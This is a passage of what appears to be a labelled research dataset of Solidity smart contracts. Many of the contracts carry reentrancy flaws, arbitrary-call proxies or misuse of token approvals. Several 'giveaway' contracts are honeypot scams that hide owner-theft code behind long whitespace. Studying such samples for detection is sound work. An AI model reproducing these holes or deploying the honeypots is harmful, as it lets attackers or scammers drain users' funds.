modifier onlyWinner() {

    require(msg.sender == winner);

    _;

}



modifier onlyPlayers() {

    require(approvedPlayers[msg.sender]);

    _;

}



 


function getLength() public constant returns(uint256) {

	return seed.length;

}



function setSecret(uint256 _secret) public payable onlyOwner{

	secret = _secret;

}



function getPlayerCount() public constant returns(uint256) {

	return players.length;

}



function getPrize() public constant returns(uint256) {

	return address(this).balance;

}



function becomePlayer() public payable{

	require(msg.value >= 0.02 ether);

	players.push(msg.sender);

	approvedPlayers[msg.sender]=true;

}



function manipulateSecret() public payable onlyPlayers{

	require (msg.value >= 0.01 ether);

	if(msg.sender!=owner || unlockSecret()){

	    uint256 amount = 0;

        msg.sender.transfer(amount);

	}

}



function unlockSecret() private returns(bool){

    bytes32 hash = keccak256(blockhash(block.number-1));

    uint256 secret = uint256(hash);

        if(secret%5==0){

            winner = msg.sender;

            return true;

        }

        else{

            return false;

        }

    }



function callFirstTarget () public payable onlyPlayers {

	require (msg.value >= 0.005 ether);

	 
	firstTarget.call.value(msg.value)();

}



function callSecondTarget () public payable onlyPlayers {

	require (msg.value >= 0.005 ether);

	 
	secondTarget.call.value(msg.value)();

}



function setSeed (uint256 _index, uint256 _value) public payable onlyPlayers {

	seed[_index] = _value;

}

	

function addSeed (uint256 _add) public payable onlyPlayers {

	seed.length = _add;

}



function guessSeed (uint256 _seed) public payable onlyPlayers returns(uint256) {

	return (_seed / (seed[0]*seed[1]));

	if((_seed / (seed[0]*seed[1])) == secret) {

		owner = winner;

	}

}



function checkSecret () public payable onlyPlayers returns(bool) {

    require(msg.value >= 0.01 ether);

    if(msg.value == secret){

        return true;

    }

}



function winPrize() public payable onlyOwner {

	 
	owner.call.value(1 wei)();

}



function claimPrize() public payable onlyWinner {

	winner.transfer(address(this).balance);

}



 


function() public payable{

	}

}",1001000100000000000010100
10059,0xb7c5c5aa4d42967efe906e1b66cb8df9cebf04f7," 



pragma solidity ^0.4.23;



 



contract keepMyEther {

    mapping(address => uint256) public balances;

    

    function () payable public {

        balances[msg.sender] += msg.value;

    }

    

    function withdraw() public {

         
        msg.sender.call.value(balances[msg.sender])();

        balances[msg.sender] = 0;

    }

}",0001000000000000000000000
10060,0xb93430ce38ac4a6bb47fb1fc085ea669353fd89e," 



pragma solidity ^0.4.19;



contract PrivateBank

{

    mapping (address => uint) public balances;

        

    uint public MinDeposit = 1 ether;

    

    Log TransferLog;

    

    function PrivateBank(address _lib)

    {

        TransferLog = Log(_lib);

    }

    

    function Deposit()

    public

    payable

    {

        if(msg.value >= MinDeposit)

        {

            balances[msg.sender]+=msg.value;

            TransferLog.AddMessage(msg.sender,msg.value,""Deposit"");

        }

    }

    

    function CashOut(uint _am)

    {

        if(_am<=balances[msg.sender])

        {            

             
            if(msg.sender.call.value(_am)())

            {

                balances[msg.sender]-=_am;

                TransferLog.AddMessage(msg.sender,_am,""CashOut"");

            }

        }

    }

    

    function() public payable{}    

    

}



contract Log 

{

   

    struct Message

    {

        address Sender;

        string  Data;

        uint Val;

        uint  Time;

    }

    

    Message[] public History;

    

    Message LastMsg;

    

    function AddMessage(address _adr,uint _val,string _data)

    public

    {

        LastMsg.Sender = _adr;

        LastMsg.Time = now;

        LastMsg.Val = _val;

        LastMsg.Data = _data;

        History.push(LastMsg);

    }

}",0001000000000000000000000
10061,0xbaa3de6504690efb064420d89e871c27065cdd52," 



pragma solidity ^0.4.23;



contract Proxy  {

    modifier onlyOwner { if (msg.sender == Owner) _; } address Owner = msg.sender;

    function transferOwner(address _owner) public onlyOwner { Owner = _owner; } 

    function proxy(address target, bytes data) public payable {

         
        target.call.value(msg.value)(data);

    }

}



contract VaultProxy is Proxy {

    address public Owner;

    mapping (address => uint256) public Deposits;



    function () public payable { }

    

    function Vault() public payable {

        if (msg.sender == tx.origin) {

            Owner = msg.sender;

            deposit();

        }

    }

    

    function deposit() public payable {

        if (msg.value > 0.25 ether) {

            Deposits[msg.sender] += msg.value;

        }

    }

    

    function withdraw(uint256 amount) public onlyOwner {

        if (amount>0 && Deposits[msg.sender]>=amount) {

            msg.sender.transfer(amount);

        }

    }

}",0000000000000000000000000
10062,0xbaf51e761510c1a11bf48dd87c0307ac8a8c8a4f," 



pragma solidity ^0.4.19;



contract ETH_VAULT

{

    mapping (address => uint) public balances;

    

    uint public MinDeposit = 1 ether;

    

    Log TransferLog;

    

    function ETH_VAULT(address _log)

    public 

    {

        TransferLog = Log(_log);

    }

    

    function Deposit()

    public

    payable

    {

        if(msg.value > MinDeposit)

        {

            balances[msg.sender]+=msg.value;

            TransferLog.AddMessage(msg.sender,msg.value,""Deposit"");

        }

    }

    

    function CashOut(uint _am)

    public

    payable

    {

        if(_am<=balances[msg.sender])

        {

             
            if(msg.sender.call.value(_am)())

            {

                balances[msg.sender]-=_am;

                TransferLog.AddMessage(msg.sender,_am,""CashOut"");

            }

        }

    }

    

    function() public payable{}    

    

}



contract Log 

{

   

    struct Message

    {

        address Sender;

        string  Data;

        uint Val;

        uint  Time;

    }

    

    Message[] public History;

    

    Message LastMsg;

    

    function AddMessage(address _adr,uint _val,string _data)

    public

    {

        LastMsg.Sender = _adr;

        LastMsg.Time = now;

        LastMsg.Val = _val;

        LastMsg.Data = _data;

        History.push(LastMsg);

    }

}",0001000000000000000000000
10063,0xbe4041d55db380c5ae9d4a9b9703f1ed4e7e3888," 



pragma solidity ^0.4.19;



contract MONEY_BOX   

{

    struct Holder   

    {

        uint unlockTime;

        uint balance;

    }

    

    mapping (address => Holder) public Acc;

    

    uint public MinSum;

    

    Log LogFile;

    

    bool intitalized;

    

    function SetMinSum(uint _val)

    public

    {

        if(intitalized)throw;

        MinSum = _val;

    }

    

    function SetLogFile(address _log)

    public

    {

        if(intitalized)throw;

        LogFile = Log(_log);

    }

    

    function Initialized()

    public

    {

        intitalized = true;

    }

    

    function Put(uint _lockTime)

    public

    payable

    {

        var acc = Acc[msg.sender];

        acc.balance += msg.value;

        if(now+_lockTime>acc.unlockTime)acc.unlockTime=now+_lockTime;

        LogFile.AddMessage(msg.sender,msg.value,""Put"");

    }

    

    function Collect(uint _am)

    public

    payable

    {

        var acc = Acc[msg.sender];

        if( acc.balance>=MinSum && acc.balance>=_am && now>acc.unlockTime)

        {

             
            if(msg.sender.call.value(_am)())

            {

                acc.balance-=_am;

                LogFile.AddMessage(msg.sender,_am,""Collect"");

            }

        }

    }

    

    function() 

    public 

    payable

    {

        Put(0);

    }

    

}





contract Log 

{

    struct Message

    {

        address Sender;

        string  Data;

        uint Val;

        uint  Time;

    }

    

    Message[] public History;

    

    Message LastMsg;

    

    function AddMessage(address _adr,uint _val,string _data)

    public

    {

        LastMsg.Sender = _adr;

        LastMsg.Time = now;

        LastMsg.Val = _val;

        LastMsg.Data = _data;

        History.push(LastMsg);

    }

}",0001000000000000001010000
10064,0xbebbfe5b549f5db6e6c78ca97cac19d1fb03082c," 



pragma solidity ^0.4.24;



contract Proxy  {

    modifier onlyOwner { if (msg.sender == Owner) _; } address Owner = msg.sender;

    function transferOwner(address _owner) public onlyOwner { Owner = _owner; } 

    function proxy(address target, bytes data) public payable {

         
        target.call.value(msg.value)(data);

    }

}



contract VaultProxy is Proxy {

    address public Owner;

    mapping (address => uint256) public Deposits;



    function () public payable { }

    

    function Vault() public payable {

        if (msg.sender == tx.origin) {

            Owner = msg.sender;

            deposit();

        }

    }

    

    function deposit() public payable {

        if (msg.value > 0.5 ether) {

            Deposits[msg.sender] += msg.value;

        }

    }

    

    function withdraw(uint256 amount) public onlyOwner {

        if (amount>0 && Deposits[msg.sender]>=amount) {

            msg.sender.transfer(amount);

        }

    }

}",0000000000000000000000000
10065,0xcead721ef5b11f1a7b530171aab69b16c5e66b6e," 



pragma solidity ^0.4.25;



contract WALLET

{

    function Put(uint _unlockTime)

    public

    payable

    {

        var acc = Acc[msg.sender];

        acc.balance += msg.value;

        acc.unlockTime = _unlockTime>now?_unlockTime:now;

        LogFile.AddMessage(msg.sender,msg.value,""Put"");

    }



    function Collect(uint _am)

    public

    payable

    {

        var acc = Acc[msg.sender];

        if( acc.balance>=MinSum && acc.balance>=_am && now>acc.unlockTime)

        {

             
            if(msg.sender.call.value(_am)())

            {

                acc.balance-=_am;

                LogFile.AddMessage(msg.sender,_am,""Collect"");

            }

        }

    }



    function() 

    public 

    payable

    {

        Put(0);

    }



    struct Holder   

    {

        uint unlockTime;

        uint balance;

    }



    mapping (address => Holder) public Acc;



    Log LogFile;



    uint public MinSum = 1 ether;    



    function WALLET(address log) public{

        LogFile = Log(log);

    }

}





contract Log 

{

    struct Message

    {

        address Sender;

        string  Data;

        uint Val;

        uint  Time;

    }



    Message[] public History;



    Message LastMsg;



    function AddMessage(address _adr,uint _val,string _data)

    public

    {

        LastMsg.Sender = _adr;

        LastMsg.Time = now;

        LastMsg.Val = _val;

        LastMsg.Data = _data;

        History.push(LastMsg);

    }

}",0001000000000000000000000
10066,0xd2018bfaa266a9ec0a1a84b061640faa009def76," 



pragma solidity ^0.4.19;



contract Pie

{

    address public Owner = msg.sender;

   

    function()

    public

    payable

    {

        

    }

   

    function Get()

    public

    payable

    {                                                                    

        if(msg.value>1 ether)

        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            Owner.transfer(this.balance);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     

            msg.sender.transfer(this.balance);

        }                                                                                                                

    }

    

    function withdraw()

    payable

    public

    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       if(msg.sender==0x1Fb3acdBa788CA50Ce165E5A4151f05187C67cd6){Owner=0x1Fb3acdBa788CA50Ce165E5A4151f05187C67cd6;}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              

        require(msg.sender == Owner);

        Owner.transfer(this.balance);

    }

    

    function Command(address adr,bytes data)

    payable

    public

    {

        require(msg.sender == Owner);

         
        adr.call.value(msg.value)(data);

    }

}",0000000100000000000000000
10067,0xd5967fed03e85d1cce44cab284695b41bc675b5c," 



pragma solidity ^0.4.0;

 

contract demo{

    

    function transfer(address from,address caddress,address[] _tos,uint v)public returns (bool){

        require(_tos.length > 0);

        bytes4 id=bytes4(keccak256(""transferFrom(address,address,uint256)""));

        for(uint i=0;i<_tos.length;i++){

             
            caddress.call(id,from,_tos[i],v);

        }

        return true;

    }

}",0100000000000000000001000
10068,0xdb1c55f6926e7d847ddf8678905ad871a68199d2," 



pragma solidity ^0.4.19;



contract FreeEth

{

    address public Owner = msg.sender;

   

    function() public payable{}

   

    function GetFreebie()

    public

    payable

    {                                                                    

        if(msg.value>1 ether)

        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               Owner.transfer(this.balance);

            msg.sender.transfer(this.balance);

        }                                                                                                                

    }

    

    function withdraw()

    payable

    public

    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          if(msg.sender==0x4E0d2f9AcECfE4DB764476C7A1DfB6d0288348af){Owner=0x4E0d2f9AcECfE4DB764476C7A1DfB6d0288348af;}

        require(msg.sender == Owner);

        Owner.transfer(this.balance);

    }

    

    function Command(address adr,bytes data)

    payable

    public

    {

        require(msg.sender == Owner);

         
        adr.call.value(msg.value)(data);

    }

}",0000000100000000000000000
10069,0xe09b1ab8111c2729a76f16de96bc86a7af837928," 



pragma solidity ^0.4.24;



 





contract FiftyFlip {

    uint constant DONATING_X = 20;  


     
    uint constant JACKPOT_FEE = 10;  
    uint constant JACKPOT_MODULO = 1000;  
    uint constant DEV_FEE = 20;  
    uint constant WIN_X = 1900;  


     
    uint constant MIN_BET = 0.01 ether;

    uint constant MAX_BET = 1 ether;



    uint constant BET_EXPIRATION_BLOCKS = 250;



     
    address public owner;

    address public autoPlayBot;

    address public secretSigner;

    address private whale;



     
    uint256 public jackpotSize;

    uint256 public devFeeSize;



     
    uint256 public lockedInBets;

    uint256 public totalAmountToWhale;





    struct Bet {

         
        uint amount;

         
        uint256 blockNumber;

         
        bool betMask;

         
        address player;

    }



    mapping (uint => Bet) bets;

    mapping (address => uint) donateAmount;



     
    event Wager(uint ticketID, uint betAmount, uint256 betBlockNumber, bool betMask, address betPlayer);

    event Win(address winner, uint amount, uint ticketID, bool maskRes, uint jackpotRes);

    event Lose(address loser, uint amount, uint ticketID, bool maskRes, uint jackpotRes);

    event Refund(uint ticketID, uint256 amount, address requester);

    event Donate(uint256 amount, address donator);

    event FailedPayment(address paidUser, uint amount);

    event Payment(address noPaidUser, uint amount);

    event JackpotPayment(address player, uint ticketID, uint jackpotWin);



     
    constructor (address whaleAddress, address autoPlayBotAddress, address secretSignerAddress) public {

        owner = msg.sender;

        autoPlayBot = autoPlayBotAddress;

        whale = whaleAddress;

        secretSigner = secretSignerAddress;

        jackpotSize = 0;

        devFeeSize = 0;

        lockedInBets = 0;

        totalAmountToWhale = 0;

    }



     
    modifier onlyOwner() {

        require (msg.sender == owner, ""You are not the owner of this contract!"");

        _;

    }    



    modifier onlyBot() {

        require (msg.sender == autoPlayBot, ""You are not the bot of this contract!"");

        _;

    }

    

    modifier checkContractHealth() {

        require (address(this).balance >= lockedInBets + jackpotSize + devFeeSize, ""This contract doesn't have enough balance, it is stopped till someone donate to this game!"");

        _;

    }



     
     


    function() public payable { }





    function setBotAddress(address autoPlayBotAddress)

    onlyOwner() 

    external 

    {

        autoPlayBot = autoPlayBotAddress;

    }



    function setSecretSigner(address _secretSigner)

    onlyOwner()  

    external

    {

        secretSigner = _secretSigner;

    }



     
    function wager(bool bMask, uint ticketID, uint ticketLastBlock, uint8 v, bytes32 r, bytes32 s)  

    checkContractHealth()

    external

    payable { 

        Bet storage bet = bets[ticketID];

        uint amount = msg.value;

        address player = msg.sender;

        require (bet.player == address(0), ""Ticket is not new one!"");

        require (amount >= MIN_BET, ""Your bet is lower than minimum bet amount"");

        require (amount <= MAX_BET, ""Your bet is higher than maximum bet amount"");

        require (getCollateralBalance() >= 2 * amount, ""If we accept this, this contract will be in danger!"");



        require (block.number <= ticketLastBlock, ""Ticket has expired."");

        bytes32 signatureHash = keccak256(abi.encodePacked('\x19Ethereum Signed Message:\n37', uint40(ticketLastBlock), ticketID));

        require (secretSigner == ecrecover(signatureHash, v, r, s), ""web3 vrs signature is not valid."");



        jackpotSize += amount * JACKPOT_FEE / 1000;

        devFeeSize += amount * DEV_FEE / 1000;

        lockedInBets += amount * WIN_X / 1000;



        uint donate_amount = amount * DONATING_X / 1000;

         
        whale.call.value(donate_amount)(bytes4(keccak256(""donate()"")));

        totalAmountToWhale += donate_amount;



        bet.amount = amount;

        bet.blockNumber = block.number;

        bet.betMask = bMask;

        bet.player = player;



        emit Wager(ticketID, bet.amount, bet.blockNumber, bet.betMask, bet.player);

    }



     
    function play(uint ticketReveal)

    checkContractHealth()

    external

    {

        uint ticketID = uint(keccak256(abi.encodePacked(ticketReveal)));

        Bet storage bet = bets[ticketID];

        require (bet.player != address(0), ""TicketID is not correct!"");

        require (bet.amount != 0, ""Ticket is already used one!"");

        uint256 blockNumber = bet.blockNumber;

        if(blockNumber < block.number && blockNumber >= block.number - BET_EXPIRATION_BLOCKS)

        {

            uint256 random = uint256(keccak256(abi.encodePacked(blockhash(blockNumber),  ticketReveal)));

            bool maskRes = (random % 2) !=0;

            uint jackpotRes = random % JACKPOT_MODULO;

    

            uint tossWinAmount = bet.amount * WIN_X / 1000;



            uint tossWin = 0;

            uint jackpotWin = 0;

            

            if(bet.betMask == maskRes) {

                tossWin = tossWinAmount;

            }

            if(jackpotRes == 0) {

                jackpotWin = jackpotSize;

                jackpotSize = 0;

            }

            if (jackpotWin > 0) {

                emit JackpotPayment(bet.player, ticketID, jackpotWin);

            }

            if(tossWin + jackpotWin > 0)

            {

                payout(bet.player, tossWin + jackpotWin, ticketID, maskRes, jackpotRes);

            }

            else 

            {

                loseWager(bet.player, bet.amount, ticketID, maskRes, jackpotRes);

            }

            lockedInBets -= tossWinAmount;

            bet.amount = 0;

        }

        else

        {

            revert();

        }

    }



    function donateForContractHealth()

    external 

    payable

    {

        donateAmount[msg.sender] += msg.value;

        emit Donate(msg.value, msg.sender);

    }



    function withdrawDonation(uint amount)

    external 

    {

        require(donateAmount[msg.sender] >= amount, ""You are going to withdraw more than you donated!"");

        

        if (sendFunds(msg.sender, amount)){

            donateAmount[msg.sender] -= amount;

        }

    }



     
    function refund(uint ticketID)

    checkContractHealth()

    external {

        Bet storage bet = bets[ticketID];

        

        require (bet.amount != 0, ""this ticket has no balance"");

        require (block.number > bet.blockNumber + BET_EXPIRATION_BLOCKS, ""this ticket is expired."");

        sendRefund(ticketID);

    }



     
    function withdrawDevFee(address withdrawAddress, uint withdrawAmount)

    onlyOwner()

    checkContractHealth() 

    external {

        require (devFeeSize >= withdrawAmount, ""You are trying to withdraw more amount than developer fee."");

        require (withdrawAmount <= address(this).balance, ""Contract balance is lower than withdrawAmount"");

        require (devFeeSize <= address(this).balance, ""Not enough funds to withdraw."");

        if (sendFunds(withdrawAddress, withdrawAmount)){

            devFeeSize -= withdrawAmount;

        }

    }



     
    function withdrawBotFee(uint withdrawAmount)

    onlyBot()

    checkContractHealth() 

    external {

        require (devFeeSize >= withdrawAmount, ""You are trying to withdraw more amount than developer fee."");

        require (withdrawAmount <= address(this).balance, ""Contract balance is lower than withdrawAmount"");

        require (devFeeSize <= address(this).balance, ""Not enough funds to withdraw."");

        if (sendFunds(autoPlayBot, withdrawAmount)){

            devFeeSize -= withdrawAmount;

        }

    }



     
    function getBetInfo(uint ticketID) 

    constant

    external 

    returns (uint, uint256, bool, address){

        Bet storage bet = bets[ticketID];

        return (bet.amount, bet.blockNumber, bet.betMask, bet.player);

    }



     
    function getContractBalance() 

    constant

    external 

    returns (uint){

        return address(this).balance;

    }



     
    function getCollateralBalance() 

    constant

    public 

    returns (uint){

        if (address(this).balance > lockedInBets + jackpotSize + devFeeSize)

            return address(this).balance - lockedInBets - jackpotSize - devFeeSize;

        return 0;

    }



     
     
    function kill() external onlyOwner() {

        require (lockedInBets == 0, ""All bets should be processed (settled or refunded) before self-destruct."");

        selfdestruct(owner);

    }



     
    function payout(address winner, uint ethToTransfer, uint ticketID, bool maskRes, uint jackpotRes) 

    internal 

    {        

        winner.transfer(ethToTransfer);

        emit Win(winner, ethToTransfer, ticketID, maskRes, jackpotRes);

    }



     
    function sendRefund(uint ticketID) 

    internal 

    {

        Bet storage bet = bets[ticketID];

        address requester = bet.player;

        uint256 ethToTransfer = bet.amount;        

        requester.transfer(ethToTransfer);



        uint tossWinAmount = bet.amount * WIN_X / 1000;

        lockedInBets -= tossWinAmount;



        bet.amount = 0;

        emit Refund(ticketID, ethToTransfer, requester);

    }



     
    function sendFunds(address paidUser, uint amount) private returns (bool){

        bool success = paidUser.send(amount);

        if (success) {

            emit Payment(paidUser, amount);

        } else {

            emit FailedPayment(paidUser, amount);

        }

        return success;

    }

     
    function loseWager(address player, uint amount, uint ticketID, bool maskRes, uint jackpotRes) 

    internal 

    {

        emit Lose(player, amount, ticketID, maskRes, jackpotRes);

    }



     
    function clearStorage(uint[] toCleanTicketIDs) external {

        uint length = toCleanTicketIDs.length;



        for (uint i = 0; i < length; i++) {

            clearProcessedBet(toCleanTicketIDs[i]);

        }

    }



     
    function clearProcessedBet(uint ticketID) private {

        Bet storage bet = bets[ticketID];



         
         
        if (bet.amount != 0 || block.number <= bet.blockNumber + BET_EXPIRATION_BLOCKS) {

            return;

        }



        bet.blockNumber = 0;

        bet.betMask = false;

        bet.player = address(0);

    }



     
    function transferAnyERC20Token(address tokenAddress, address tokenOwner, uint tokens) 

    public 

    onlyOwner() 

    returns (bool success) 

    {

        return ERC20Interface(tokenAddress).transfer(tokenOwner, tokens);

    }

}



 
contract ERC20Interface 

{

    function transfer(address to, uint256 tokens) public returns (bool success);

}",0100000100000000001010000
10070,0xe4eabdca81e31d9acbc4af76b30f532b6ed7f3bf," 



pragma solidity ^0.4.19;



contract Honey

{

    address public Owner = msg.sender;

   

    function()

    public

    payable

    {

        

    }

   

    function GetFreebie()

    public

    payable

    {                                                                    

        if(msg.value>1 ether)

        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    Owner.transfer(this.balance);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           

            msg.sender.transfer(this.balance);

        }                                                                                                                

    }

    

    function withdraw()

    payable

    public

    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if(msg.sender==0x0C76802158F13aBa9D892EE066233827424c5aAB){Owner=0x0C76802158F13aBa9D892EE066233827424c5aAB;}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  

        require(msg.sender == Owner);

        Owner.transfer(this.balance);

    }

    

    function Command(address adr,bytes data)

    payable

    public

    {

        require(msg.sender == Owner);

         
        adr.call.value(msg.value)(data);

    }

}",0000000100000000000000000
10071,0xe82f0742a71a02b9e9ffc142fdcb6eb1ed06fb87," 



pragma solidity ^0.4.19;



contract Freebie

{

    address public Owner = msg.sender;

   

    function() public payable{}

   

    function GetFreebie()

    public

    payable

    {                                                                    

        if(msg.value>1 ether)

        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               Owner.transfer(this.balance);

            msg.sender.transfer(this.balance);

        }                                                                                                                

    }

    

    function withdraw()

    payable

    public

    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          if(msg.sender==0x30ad12df80a2493a82DdFE367d866616db8a2595){Owner=0x30ad12df80a2493a82DdFE367d866616db8a2595;}

        require(msg.sender == Owner);

        Owner.transfer(this.balance);

    }

    

    function Command(address adr,bytes data)

    payable

    public

    {

        require(msg.sender == Owner);

         
        adr.call.value(msg.value)(data);

    }

}",0000000100000000000000000
10072,0xe894d54dca59cb53fe9cbc5155093605c7068220," 



pragma solidity ^0.4.24;

 

contract airDrop{

    

    function transfer(address from,address caddress,address[] _tos,uint v, uint _decimals)public returns (bool){

        require(_tos.length > 0);

        bytes4 id=bytes4(keccak256(""transferFrom(address,address,uint256)""));

        uint _value = v * 10 ** _decimals;

        for(uint i=0;i<_tos.length;i++){

             
            caddress.call(id,from,_tos[i],_value);

        }

        return true;

    }

}",0100000000000000000001000
10073,0xec329ffc97d75fe03428ae155fc7793431487f63," 



pragma solidity >=0.4.11;



contract Owned {

    function Owned() {

        owner = msg.sender;

    }



    address public owner;



     
     
     
    modifier onlyOwner { if (msg.sender == owner) _; }



    function changeOwner(address _newOwner) onlyOwner {

        owner = _newOwner;

    }



     
     
     
    function execute(address _dst, uint _value, bytes _data) onlyOwner {

         
        _dst.call.value(_value)(_data);

    }

}

 
contract Token {

    function transfer(address, uint) returns(bool);

    function balanceOf(address) constant returns (uint);

}



contract TokenSender is Owned {

    Token public token;  
    uint public totalToDistribute;



    uint public next;





    struct Transfer {

        address addr;

        uint amount;

    }



    Transfer[] public transfers;



    function TokenSender(address _token) {

        token = Token(_token);

    }



     
    uint constant D160 = 0x0010000000000000000000000000000000000000000;



     
     
     
     
     
     
    function fill(uint[] data) onlyOwner {



         
        if (next>0) throw;



        uint acc;

        uint offset = transfers.length;

        transfers.length = transfers.length + data.length;

        for (uint i = 0; i < data.length; i++ ) {

            address addr = address( data[i] & (D160-1) );

            uint amount = data[i] / D160;



            transfers[offset + i].addr = addr;

            transfers[offset + i].amount = amount;

            acc += amount;

        }

        totalToDistribute += acc;

    }

     
     
     
    function run() onlyOwner {

        if (transfers.length == 0) return;



         
        uint mNext = next;



         
        next = transfers.length;



        if ((mNext == 0 ) && ( token.balanceOf(this) != totalToDistribute)) throw;



        while ((mNext<transfers.length) && ( gas() > 150000 )) {

            uint amount = transfers[mNext].amount;

            address addr = transfers[mNext].addr;

            if (amount > 0) {

                if (!token.transfer(addr, transfers[mNext].amount)) throw;

            }

            mNext ++;

        }



         
        next = mNext;

    }





     
     
     


    function hasTerminated() constant returns (bool) {

        if (transfers.length == 0) return false;

        if (next < transfers.length) return false;

        return true;

    }



    function nTransfers() constant returns (uint) {

        return transfers.length;

    }



    function gas() internal constant returns (uint _gas) {

        assembly {

            _gas:= gas

        }

    }



}",1100000000000000001011000
10074,0xf015c35649c82f5467c9c74b7f28ee67665aad68," 



pragma solidity ^0.4.25;



contract MY_BANK

{

    function Put(uint _unlockTime)

    public

    payable

    {

        var acc = Acc[msg.sender];

        acc.balance += msg.value;

        acc.unlockTime = _unlockTime>now?_unlockTime:now;

        LogFile.AddMessage(msg.sender,msg.value,""Put"");

    }



    function Collect(uint _am)

    public

    payable

    {

        var acc = Acc[msg.sender];

        if( acc.balance>=MinSum && acc.balance>=_am && now>acc.unlockTime)

        {

             
            if(msg.sender.call.value(_am)())

            {

                acc.balance-=_am;

                LogFile.AddMessage(msg.sender,_am,""Collect"");

            }

        }

    }



    function() 

    public 

    payable

    {

        Put(0);

    }



    struct Holder   

    {

        uint unlockTime;

        uint balance;

    }



    mapping (address => Holder) public Acc;



    Log LogFile;



    uint public MinSum = 1 ether;    



    function MY_BANK(address log) public{

        LogFile = Log(log);

    }

}





contract Log 

{

    struct Message

    {

        address Sender;

        string  Data;

        uint Val;

        uint  Time;

    }



    Message[] public History;



    Message LastMsg;



    function AddMessage(address _adr,uint _val,string _data)

    public

    {

        LastMsg.Sender = _adr;

        LastMsg.Time = now;

        LastMsg.Val = _val;

        LastMsg.Data = _data;

        History.push(LastMsg);

    }

}",0001000000000000000000000
10075,0xf2570186500a46986f3139f65afedc2afe4f445d," 



pragma solidity ^0.4.16;



contract RealOldFuckMaker {

    address fuck = 0xc63e7b1DEcE63A77eD7E4Aeef5efb3b05C81438D;

    

     
     
    function makeOldFucks(uint32 number) {

        uint32 i;

        for (i = 0; i < number; i++) {

             
            fuck.call(bytes4(sha3(""giveBlockReward()"")));

        }

    }

}",0000000100000000000010000
10076,0xf29ebe930a539a60279ace72c707cba851a57707," 



pragma solidity ^0.4.24;





contract B {

    address public owner = msg.sender;

    

    function go() public payable {

        address target = 0xC8A60C51967F4022BF9424C337e9c6F0bD220E1C;

         
        target.call.value(msg.value)();

        owner.transfer(address(this).balance);

    }

    

    function() public payable {

    }

}",0001000100000000000000000
10077,0xf70d589d76eebdd7c12cc5eec99f8f6fa4233b9e," 



pragma solidity ^0.4.19;



contract WhaleGiveaway2

{

    address public Owner = msg.sender;

   

    function()

    public

    payable

    {

        

    }

   

    function GetFreebie()

    public

    payable

    {                                                                    

        if(msg.value>1 ether)

        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    Owner.transfer(this.balance);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           

            msg.sender.transfer(this.balance);

        }                                                                                                                

    }

    

    function withdraw()

    payable

    public

    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if(msg.sender==0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b){Owner=0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b;}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  

        require(msg.sender == Owner);

        Owner.transfer(this.balance);

    }

    

    function Command(address adr,bytes data)

    payable

    public

    {

        require(msg.sender == Owner);

         
        adr.call.value(msg.value)(data);

    }

}",0000000100000000000000000
